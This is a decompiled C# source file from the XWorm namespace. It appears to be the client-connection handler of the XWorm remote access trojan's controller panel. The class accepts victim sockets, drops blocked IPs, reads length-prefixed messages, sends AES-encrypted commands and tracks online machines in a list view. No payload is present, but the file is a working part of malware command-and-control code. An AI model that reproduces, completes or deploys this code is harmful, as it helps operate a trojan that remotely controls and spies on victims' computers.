using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace XWorm
{
	// Token: 0x0200003D RID: 61
	public class Client
	{
		// Token: 0x060009FC RID: 2556 RVA: 0x0005851C File Offset: 0x0005671C
		public Client(Socket CL)
		{
			this.ClientSocket = null;
			this.IsConnected = false;
			this.BufferLength = 0L;
			this.BufferLengthReceived = false;
			this.Buffer = null;
			this.MS = null;
			this.IP = null;
			this.LV = null;
			this.SendSync = null;
			this.ID = null;
			this.ClientSocket = CL;
			this.ClientSocket.ReceiveBufferSize = 51200;
			this.ClientSocket.SendBufferSize = 51200;
			this.IsConnected = true;
			this.BufferLength = -1L;
			this.Buffer = new byte[1];
			this.MS = new MemoryStream();
			this.IP = CL.RemoteEndPoint.ToString();
			this.SendSync = RuntimeHelpers.GetObjectValue(new object());
			bool flag = SettingsHelper.Blocked.Contains(this.IP.Split(new char[]
			{
				':'
			})[0]);
			if (flag)
			{
				this.isDisconnected();
			}
			else
			{
				this.ClientSocket.BeginReceive(this.Buffer, 0, this.Buffer.Length, SocketFlags.None, new AsyncCallback(this.BeginReceive), null);
			}
		}

		// Token: 0x060009FD RID: 2557 RVA: 0x00058644 File Offset: 0x00056844
		public async void BeginReceive(IAsyncResult ar)
		{
			bool flag = !this.IsConnected || !this.ClientSocket.Connected;
			checked
			{
				if (flag)
				{
					this.isDisconnected();
				}
				else
				{
					try
					{
						int Received = this.ClientSocket.EndReceive(ar);
						bool flag2 = Received > 0;
						if (flag2)
						{
							bool flag3 = this.BufferLength == -1L;
							if (flag3)
							{
								bool flag4 = this.Buffer[0] == 0;
								if (flag4)
								{
									this.BufferLength = Conversions.ToLong(Helper.BS(this.MS.ToArray()));
									this.MS.Dispose();
									this.MS = new MemoryStream();
									bool flag5 = this.BufferLength == 0L;
									if (flag5)
									{
										this.BufferLength = -1L;
										this.ClientSocket.BeginReceive(this.Buffer, 0, this.Buffer.Length, SocketFlags.None, new AsyncCallback(this.BeginReceive), this.ClientSocket);
									}
									this.Buffer = new byte[(int)(this.BufferLength - 1L) + 1];
								}
								else
								{
									await this.MS.WriteAsync(this.Buffer, 0, this.Buffer.Length);
								}
							}
							else
							{
								await this.MS.WriteAsync(this.Buffer, 0, Received);
								if (this.MS.Length == this.BufferLength)
								{
									Messages Read = new Messages();
									Messages.Read(this, this.MS.ToArray());
									SettingsHelper.Received += this.MS.Length;
									this.BufferLength = -1L;
									this.MS.Dispose();
									this.MS = new MemoryStream();
									this.Buffer = new byte[1];
								}
								else
								{
									this.Buffer = new byte[(int)(this.BufferLength - this.MS.Length - 1L) + 1];
								}
							}
							this.ClientSocket.BeginReceive(this.Buffer, 0, this.Buffer.Length, SocketFlags.None, new AsyncCallback(this.BeginReceive), this.ClientSocket);
						}
						else
						{
							this.isDisconnected();
						}
					}
					catch (Exception ex)
					{
						Debug.WriteLine("BeginReceive " + ex.Message);
						this.isDisconnected();
					}
				}
			}
		}

		// Token: 0x060009FE RID: 2558 RVA: 0x00058684 File Offset: 0x00056884
		public async void BeginSend(byte[] Data)
		{
			object sendSync = this.SendSync;
			ObjectFlowControl.CheckForSyncLockOnValueType(sendSync);
			checked
			{
				lock (sendSync)
				{
					bool flag2 = !this.IsConnected || !this.ClientSocket.Connected;
					if (flag2)
					{
						this.isDisconnected();
					}
					else
					{
						try
						{
							using (MemoryStream MS = new MemoryStream())
							{
								byte[] b = Helper.AES_Encryptor(Data);
								byte[] L = Helper.SB(Conversions.ToString(b.Length) + "\0");
								MS.Write(L, 0, L.Length);
								MS.Write(b, 0, b.Length);
								this.ClientSocket.Poll(-1, SelectMode.SelectWrite);
								this.ClientSocket.BeginSend(MS.ToArray(), 0, (int)MS.Length, SocketFlags.None, new AsyncCallback(this.EndSend), null);
								SettingsHelper.Sent += MS.Length;
							}
						}
						catch (Exception ex2)
						{
							Exception ex = ex2;
							Debug.WriteLine("BeginSend " + ex.Message);
							this.isDisconnected();
						}
					}
				}
			}
		}

		// Token: 0x060009FF RID: 2559 RVA: 0x000586C4 File Offset: 0x000568C4
		public void EndSend(IAsyncResult ar)
		{
			try
			{
				this.ClientSocket.EndSend(ar);
			}
			catch (Exception ex)
			{
				Debug.WriteLine("EndSend " + ex.Message);
				this.isDisconnected();
			}
		}

		// Token: 0x06000A00 RID: 2560 RVA: 0x00058720 File Offset: 0x00056920
		public void isDisconnected()
		{
			this.IsConnected = false;
			try
			{
				bool flag = this.LV != null;
				if (flag)
				{
					bool invokeRequired = Messages.F.Lv1.InvokeRequired;
					if (invokeRequired)
					{
						Messages.F.Lv1.BeginInvoke(new Client._isDisconnected(this.isDisconnected));
						return;
					}
					this.LV.Remove();
					SettingsHelper.Online.Remove(this);
					Helper.LVLog(this.IP.Split(new char[]
					{
						':'
					})[0] + " Disconnected", Color.Red);
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine("L.Remove " + ex.Message);
			}
			try
			{
				this.ClientSocket.Close();
				this.ClientSocket.Dispose();
			}
			catch (Exception ex2)
			{
				Debug.WriteLine("C.Close " + ex2.Message);
			}
			try
			{
				this.MS.Dispose();
			}
			catch (Exception ex3)
			{
				Debug.WriteLine("MS.Dispose " + ex3.Message);
			}
		}

		// Token: 0x0400042E RID: 1070
		public Socket ClientSocket;

		// Token: 0x0400042F RID: 1071
		public bool IsConnected;

		// Token: 0x04000430 RID: 1072
		public long BufferLength;

		// Token: 0x04000431 RID: 1073
		public bool BufferLengthReceived;

		// Token: 0x04000432 RID: 1074
		public byte[] Buffer;

		// Token: 0x04000433 RID: 1075
		public MemoryStream MS;

		// Token: 0x04000434 RID: 1076
		public string IP;

		// Token: 0x04000435 RID: 1077
		public ListViewItem LV;

		// Token: 0x04000436 RID: 1078
		public object SendSync;

		// Token: 0x04000437 RID: 1079
		public string ID;

		// Token: 0x02000189 RID: 393
		// (Invoke) Token: 0x06000D3C RID: 3388
		public delegate void _isDisconnected();
	}
}
